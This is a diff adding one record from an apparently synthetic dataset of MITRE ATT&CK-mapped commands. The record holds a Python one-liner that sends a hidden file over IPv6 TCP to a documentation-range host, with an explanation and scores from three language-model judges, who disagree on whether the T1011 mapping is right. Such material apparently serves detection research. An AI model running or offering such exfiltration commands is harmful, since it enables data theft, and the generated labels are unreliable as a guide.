@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_STREAM); s.connect((\"2001:db8:ac:2::9\", 55999, 0, 0)); s.sendall(open(\"/Users/Shared/._q\",\"rb\").read()); s.close()'",
+  "explanation": "Sends data over IPv6 TCP on a non-standard port, leveraging IPv6 as an alternative medium relative to common IPv4/TCP C2 paths, matching T1011.",
+  "rationale_steps": [
+    "Create an IPv6 TCP socket.",
+    "Connect to a documentation IPv6 address on an uncommon port (55999).",
+    "Transmit the file as a single stream over IPv6 (alternate network medium).",
+    "No obfuscation; standard user permissions."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-afb87854",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The shell quoting and Python code are well-formed with balanced quotes and parentheses, valid IPv6 connect tuple, and proper statement separators.",
+        "semantic_score": 3,
+        "semantic_justification": "While it does exfiltrate a file over IPv6 TCP, the target IPv6 address is a non-routable documentation prefix and the mapping to T1011 is incorrect since IPv6 is a protocol change rather than a different network medium.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-09-30T23:51:18.327446Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced quotes, parentheses, and proper syntax for socket operations in Python.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by exfiltrating data over IPv6 (an alternative network medium to standard IPv4) on a non-standard port (55999), reading from a hidden file in a shared location.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T23:51:21.230792Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with correct syntax, balanced quotes, and valid function calls, making it runnable as-is.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively exfiltrates data using IPv6 on a non-standard port, which, while using the same physical network interface as IPv4, can act as an 'alternative medium' for bypassing IPv4-centric monitoring, aligning with the intent of T1011 to evade detection.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2025-09-30T23:51:38.142640Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
